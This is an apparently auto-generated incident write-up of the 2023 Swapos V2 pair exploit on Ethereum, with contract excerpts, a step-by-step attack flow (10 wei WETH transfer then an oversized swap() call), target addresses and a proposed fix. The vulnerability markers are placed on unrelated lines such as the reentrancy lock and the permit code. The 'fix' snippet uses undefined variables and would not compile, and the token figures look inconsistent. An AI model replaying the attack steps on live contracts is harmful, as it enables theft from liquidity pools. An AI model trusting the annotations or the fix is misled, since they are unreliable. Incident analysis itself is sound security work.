# Swapos V2 Exploit — Initial Reserve Manipulation via Minimal WETH Transfer

## Metadata
| Field | Value |
|---|---|
| Date | 2023-04-18 |
| Project | Swapos V2 |
| Chain | Ethereum |
| Loss | ~Unconfirmed SWP amount |
| Attacker | Unidentified |
| Attack TX | https://etherscan.io/address/0x2df07c054138bf29348f35a12a22550230bd1405 |
| Vulnerable Contract | SwapPos: 0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f |
| Block | 17,057,419 |
| CWE | CWE-682 (Incorrect Calculation — reserve manipulation) |
| Vulnerability Type | Reserve Manipulation via Minimal WETH Transfer + swap() |

## Summary
The Swapos V2 pair contract had a flaw where transferring a minimal amount of WETH (10 wei) directly to the pair before calling `swap()` allowed extraction of a massively disproportionate amount of SWP tokens. The pair's reserve calculation was skewed by the small direct transfer in a way that permitted a 142 trillion SWP token extraction.

## Vulnerability Details
- **CWE-682**: The Swapos pair's reserve accounting was manipulable: a 10 wei WETH transfer to the pair, followed by a `swap(142_658_161_144_708_222_114_663, 0, attacker, "")`, extracted tokens whose value far exceeded the 10 wei input. The pair's price formula or reserve update logic contained an arithmetic error allowing this.

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: SwaposV2Pair.sol
    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event  // ❌

// ...

    uint private unlocked = 1;  // ❌

// ...

        require(unlocked == 1, 'SwaposV2: LOCKED');  // ❌

// ...

        unlocked = 0;  // ❌

// ...

        unlocked = 1;  // ❌
```

```solidity
// File: ISwaposV2Pair.sol
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);  // ❌

// ...

    function price0CumulativeLast() external view returns (uint);  // ❌

// ...

    function price1CumulativeLast() external view returns (uint);  // ❌

// ...

    function kLast() external view returns (uint);  // ❌

// ...

    function skim(address to) external;  // ❌
```

```solidity
// File: SwaposV2ERC20.sol
        DOMAIN_SEPARATOR = keccak256(  // ❌

// ...

                keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),  // ❌

// ...

                keccak256(bytes(name)),  // ❌

// ...

                keccak256(bytes('1')),  // ❌

// ...

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external {
        require(deadline >= block.timestamp, 'SwaposV2: EXPIRED');  // ❌
        bytes32 digest = keccak256(  // ❌
            abi.encodePacked(  // ❌
                '\x19\x01',
                DOMAIN_SEPARATOR,
                keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))  // ❌
            )
        );
        address recoveredAddress = ecrecover(digest, v, r, s);
        require(recoveredAddress != address(0) && recoveredAddress == owner, 'SwaposV2: INVALID_SIGNATURE');
        _approve(owner, spender, value);
    }
```

```solidity
// File: ISwaposV2Factory.sol
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);  // ❌

// ...

    function getPair(address tokenA, address tokenB) external view returns (address pair);  // ❌

// ...

    function createPair(address tokenA, address tokenB) external returns (address pair);  // ❌
```

## Attack Flow (from testExploit())
```solidity
// 1. WETH.deposit{value: 3 ether}()
// 2. WETH.transfer(address(swapPos), 10)  // only 10 wei WETH to pair
// 3. swapPos.swap(142_658_161_144_708_222_114_663, 0, address(this), "")
//    → extracts 142 trillion SWP tokens for 10 wei WETH
// 4. Log reserves after swap
```

## Interfaces from PoC
```solidity
interface SWAPOS {
    function swap(uint256 amount0Out, uint256 amount1Out, address to,
                  bytes calldata data) external;
    function getReserves() external view returns (
        uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
}
```

## Key Addresses
| Label | Address |
|---|---|
| SWP Token | 0x09176F68003c06F190ECdF40890E3324a9589557 |
| SwapPos Pair | 0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f |
| WETH | 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 |

## Root Cause
The Swapos pair's reserve update logic or price invariant check contained an arithmetic error that allowed negligible input (10 wei) to satisfy the `k` invariant check while outputting enormous token amounts.

## Fix
```solidity
// Enforce minimum input amount and standard constant-product check:
function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {
    require(amount0Out > 0 || amount1Out > 0, "Insufficient output");
    (uint112 _reserve0, uint112 _reserve1,) = getReserves();
    // Standard Uniswap V2 k-check with proper overflow protection:
    uint balance0Adjusted = balance0 * 1000 - amount0In * 3;
    uint balance1Adjusted = balance1 * 1000 - amount1In * 3;
    require(balance0Adjusted * balance1Adjusted >= _reserve0 * _reserve1 * 1000**2,
            "K invariant violated");
}
```

## References
- CertiKAlert: https://twitter.com/CertiKAlert/status/1647530789947469825
- BeosinAlert: https://twitter.com/BeosinAlert/status/1647552192243728385
- Etherscan: 0x2df07c054138bf29348f35a12a22550230bd1405